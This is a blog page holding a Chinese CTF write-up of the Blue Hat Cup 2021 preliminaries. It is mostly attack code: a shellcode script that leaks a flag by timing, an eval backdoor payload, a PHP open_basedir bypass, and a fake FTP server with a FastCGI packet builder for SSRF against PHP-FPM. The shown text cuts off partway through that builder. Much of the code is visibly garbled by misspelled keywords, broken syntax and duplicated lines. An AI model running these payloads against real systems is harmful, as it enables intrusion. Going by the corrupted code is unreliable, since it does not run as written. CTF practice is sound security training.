@@ -1,0 +1,2337 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="第五届“蓝帽杯” 初赛WriteUp, Marmalade&#39;s Blog">
+    <meta name="description" content="一个ctfer的成长之路">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>第五届“蓝帽杯” 初赛WriteUp | Marmalade&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Marmalade's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Marmalade&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-address-card" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>关于本站</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/aboutme">
+          
+          <i class="fa fa-user-secret" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>关于我</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Marmalade&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            一个ctfer的成长之路
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-address-card"></i>
+			
+			关于
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/about " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:28px" ></i>
+			      
+		          <span>关于本站</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/aboutme " style="margin-left:50px">
+				  
+				   <i class="fa fa fa-user-secret" style="position: absolute;left:28px" ></i>
+			      
+		          <span>关于我</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/3N_2OON@VASV_9~CI06R)CC.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">第五届“蓝帽杯” 初赛WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/">
+                                <span class="chip bg-color">蓝帽杯</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/writeup/" class="post-category">
+                                writeup
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-05-14
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-05-14
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    19 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>存在shellcode执行</p>
+<p>去年蓝帽决赛原题：附带解题链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/p201821440039/p/14219506.html">https://www.cnblogs.com/p201821440039/p/14219506.html</a></p>
+<p>脚本如下：</p>
+<pre><code>from pwn import *
+elf=ELF('./chall')
+EXCV = context.binary = './chal'
+libc=('')
+#context.log_level = 'debug'
+
+def pwn, idx, c):
+      # open
+    shellcode = "push 0x10032aaa; pop rdrdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;"
+
+    # re open, rax =&gt; 4
+    shellcode += "push 2; pop rax; syscall;"
+
+    # read(rax, 0x10040, 0x50)
+    shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"
+
+    # cmp and jz
+    if idx == 0:
+        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(idx, c)
+    else:
+        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(idx, c)
+
+    shellcode = asm(shellcode)
+
+    p.sendafter("xecution-box.\n", shellcode.ljust(0x40-14, b'a') + b'/home/pwn/flag')
+
+idx = 0
+var_list = []
+while(1):
+    for c in range(32, 127):
+        p = remote("8.140.177.7",40334)#nc 8.131.246.36 40334    
+        pwn(p, idx, c)
+        start = time.time()
+        try:
+            p.recv(timeout=2)
+        excep:
+            pass
+        end = time.time()
+        p.close()
+         if end-start &gt; 1.5:
+            var_list.append(c)
+            print("".join([chr(i) for i in var_list]))
+            break
+    else:
+        print("".join([chr(i) for i in var_list]))
+        break
+    idx = idx + 1
+
+print("".join([chr(i) for i in var_list]))</code></pre><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h2><p>玩出来的</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514093434.jpg" alt="web1"></p>
+<h2 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h2><p>感谢buuctf，蓝帽复现环境提供的太及时了，太强了</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6">https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6</a></p>
+<p><a target="_blank" rel="noopener" href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/343918026">https://zhuanlan.zhihu.com/p/343918026</a></p>
+<p>源码就俩文件：</p>
+<pre><code>add_api.php
+&lt;?php
+include "user.php";
+if($user=unserialize($_COOKIE["data"])){
+    $count[++$user-&gt;count]=1;
+    if($count[]=1){
+        $user-&gt;count+=1;
+        setcookie("data",seialize($user));
+    }else{
+        eval($_GET["backdoor"]);
+    }
+}else{
+    $uuser=new User;
+    $user-&gt;count=1;
+    setcookie("data",serialize($user));
+}
+?&gt;
+user.php
+&lt;?php
+class User{
+    public $count;
+}
+?&gt;</code></pre><p>第一部分整型溢出略过</p>
+<pre><code>&lt;?php
+class User{
+    public $count=9223372036854775806;
+}
+$a = new User;
+
+echo urlencode(serialize($a));
+//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
+?&gt;</code></pre><p>第二部分可以通过eval执行代码，发现禁用了好多函数和类，而且做了open_basedir</p>
+<pre><code>disable_functions = stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive
+
+; This directive allows you to disable certain classes.
+; http://php.net/disable-classes
+
+disable_classes = Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException   Exception,SplDoublyLinkedLit,Error,ErrorException,ArgumentCountError,ArithmeticError,AsserttionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>绕过open_basedir:</p>
+<pre><code>mkdir('img');chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));</code></pre><p>可以读取到php.ini啥的，但是flag读取不了，查看权限显示为<code>0400</code>，绝对是要getshell后提权</p>
+<p>phpinfo处显示有一个easy_bypass，这个应该是预期解，web pwn</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094637.png" alt="image-20210502153907457"></p>
+<p>通过phpinfo还可以发现环境是<code>FPM/FastCGI</code>，绕过open_basedir读php.ini可以看到端口为<code>9001</code></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094639.png" alt="image-20210502154013951"></p>
+<p>考虑到可以通过攻击<code>FPM</code>来bypass</p>
+<p>因为禁用了许多函数和类，普通的ssrf无法使用，但是ftp协议未被禁用</p>
+<p>这篇文章讲的挺清楚：</p>
+<p><a target="_blank" rel="noopener" href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/</a></p>
+<p>ftp 协议相对比较复杂, 其中存在一个特性, 相信大家都听说过, 就是 ftp 的数据端口和指令端口是分开的, 我们平时所说的 21 号端口其实是 ftp 的指令端口, 用于发送指令, 比如认证用户和指定读取的文件. 但是如果是传输文件的内容, ftp 实际上会重新打开一个链接, 同时还分为两种模式, 被动模式和主动模式.</p>
+<p>这里 wikipedia 讲的比较清楚, 我直接复制一段过来</p>
+<pre><code>FTP有两种使用模式：主动和被动。主动模式要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题。所以，创立了被动模式。被动模式只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</code></pre><p>注意 <code>被动模式只要求服务器端产生一个监听相应端口的进程</code>, 这里有非常重要的一点, 这个被动模式的端口是服务器指定的, 而且还有一点是很多地方没有提到的, 实际上除了端口, 服务器的地址也是可以被指定的. 由于 ftp 和 http 类似, 协议内容全是纯文本, 我们可以很清晰的看到它是如何指定地址和端口的</p>
+<pre><code>227 Entering Passive Mode(192,168,9,2,4,8)</code></pre><p>227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语, 而 (192,168,9,2,4,8) 代表让客户端连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口.<br>这样这个如何利用就很明显了, file_put_contents 在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的 pasv 模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到 127.0.0.1:9000. 同时由于 ftp 的特性, 不会有任何的多余内容, 类似 gopher 协议, 会将 data 原封不动的发给 127.0.0.1:9000, 完美符合攻击 fastcgi 的要求.</p>
+<h3 id="伪造FTP服务器"><a href="#伪造FTP服务器" class="headerlink" title="伪造FTP服务器"></a>伪造FTP服务器</h3><pre><code>import socket
+
+host = '0.0.0.0'
+port = 2334
+sk = socket.socket()
+sk.bind((host, port))
+sk.listen(5)
+
+conn, address = sk.accept()
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+
+conn.send("300 \n")
+print '300'
+print conn.recv(20)
+
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+print "ck"
+nn.send("22 127,0,0,1,0,9001\n")
+print '200'
+print conn.recv(20)0)
+
+conn.sendd("150 \n")
+print '150'
+print conn.recv(20)
+conn.close()
+exit()</code></pre><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><pre><code>&lt;?php
+&lt;?php
+/**
+ * Note : Code is released under the GNU LGPL
+ *
+ * Please do not change the header of this file
+ *
+ * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
+ * Lesser General Public License as published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ *
+ * See the GNU Lesser General Public License for more details.
+ */
+/**
+ * Handles communication with a FastCGI application
+ *
+ * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
+ * @version     1.0
+ */
+class FCGIClient
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const ABORT_REQUEST        = 2;
+    const END_REQUEST          = 3;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const STDOUT               = 6;
+    const STDERR               = 7;
+    const DATA                 = 8;
+    const GET_VALUES           = 9;
+    const GET_VALUES_RESULT    = 10;
+    const UNKNOWN_TYPE         = 11;
+    const MAXTYPE              = self::UNKNOWN_TYPE;
+    const RESPONDER            = 1;
+    const AUTHORIZER           = 2;
+    const FILTER               = 3;
+    const REQUEST_COMPLETE     = 0;
+    const CANT_MPX_CONN        = 1;
+    const OVERLOADED           = 2;
+    const UNKNOWN_ROLE         = 3;
+    const MAX_CONNS            = 'MAX_CONNS';
+    const MAX_REQS             = 'MAX_REQS';
+    const MPXS_CONNS           = 'MPXS_CONNS';
+    const HEADER_LEN           = 8;
+    /**
+     * Socket
+     * @var Resource
+     */
+    private $_sock = null;
+    /**
+     * Host
+     * @var String
+     */
+    private $_host = null;
+    /**
+     * Port
+     * @var Integer
+     */
+    private $_port = null;
+    /**
+     * Keep Alive
+     * @var Boolean
+     */
+    private $_keepAlive = false;
+    /**
+     * Constructor
+     *
+     * @param String $host Host of the FastCGI application
+     * @param Integer $port Port of the FastCGI application
+     */
+    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
+    {
+        $this-&gt;_host = $host;
+        $this-&gt;_port = $port;
+    }
+    /**
+     * Define whether or not the FastCGI application should keep the connection
+     * alive at the end of a request
+     *
+     * @param Boolean $b true if the connection should stay alive, false otherwise
+     */
+    public function setKeepAlive($b)
+    {
+        $this-&gt;_keepAlive = (boolean)$b;
+        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
+            fclose($this-&gt;_sock);
+        }
+    }
+    /**
+     * Get the keep alive status
+     *
+     * @return Boolean true if the connection should stay alive, false otherwise
+     */
+    public function getKeepAlive()
+    {
+        return $this-&gt;_keepAlive;
+    }
+    /**
+     * Create a connection to the FastCGI application
+     */
+    private function connect()
+    {
+        if (!$this-&gt;_sock) {
+            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
+            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
+            if (!$this-&gt;_sock) {
+                throw new Exception('Unable to connect to FastCGI application');
+            }
+        }
+    }
+    /**
+     * Build a FastCGI packet
+     *
+     * @param Integer $type Type of the packet
+     * @param String $content Content of the packet
+     * @param Integer $requestId RequestId
+     */
+    private function buildPacket($type, $content, $requestId = 1)
+    {
+        $clen = strlen($content);
+        rturn chr(self::VERSION_1)         /* version */
+            . chhr($type)                    /* type */
+            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
+            . chr$requestId &amp; 0xFF)        /* requestIdB0 */
+            . chr(($$clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
+            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
+            . chr(0)                        /* paddingLength */
+            . chr(0)                        /* reserved */
+            . $content;                     /* content */
+    }
+    /**
+     * Build an FastCGI Name value pair
+     *
+     * @param String $name Name
+     * @param String $value Value
+     * @return String FastCGI Name value pair
+     */
+    private function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen &lt; 128) {
+            /* nameLengthB0 */
+            $nvpair = chr($nlen);
+        } else {
+            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        }
+        if ($vlen &lt; 128) {
+            /* valueLengthB0 */
+            $nvpair .= chr($vlen);
+        } else {
+            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        }
+        /* nameData &amp; valueData */
+        return $nvpair . $name . $value;
+    }
+    /**
+     * Read a set of FastCGI Name value pairs
+     *
+     * @param String $data Data containing the set of FastCGI NVPair
+     * @return array of NVPair
+     */
+    private function readNvpair($data, $length = null)
+    {
+        $array = array();
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen &gt;= 128) {
+                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen &gt;= 128) {
+                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    /**
+     * Decode a FastCGI Packet
+     *
+     * @param String $data String containing all the packet
+     * @return array
+     */
+    private function decodePacketHeader($data)
+    {
+        $ret = array();
+        $ret['version']       = ord($data{0});
+        $ret['type']          = ord($data{1});
